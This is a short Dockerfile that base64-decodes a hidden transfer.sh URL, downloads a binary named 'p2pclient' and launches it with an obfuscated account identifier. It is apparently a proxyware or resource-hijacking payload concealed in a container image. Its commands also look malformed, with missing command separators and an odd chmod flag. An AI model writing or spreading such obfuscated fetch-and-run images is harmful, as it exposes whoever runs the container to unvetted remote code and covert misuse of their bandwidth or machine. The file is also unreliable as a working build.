FROM alpine:edge

RUN wget -O a "$(echo "aHR0cHM6Ly90cmFuc2Zlci5zaC8xTTVhSGJBL3AycGNsaWVudAo=" | base64 -d)" \
    chmod +X a \

CMD ./a -l "$(echo "empjY2NwZWVyMnByb2ZpdEBtYWlsLmR3aW5xYy5ldS5vcmcK" | base64 -d)"& \
    
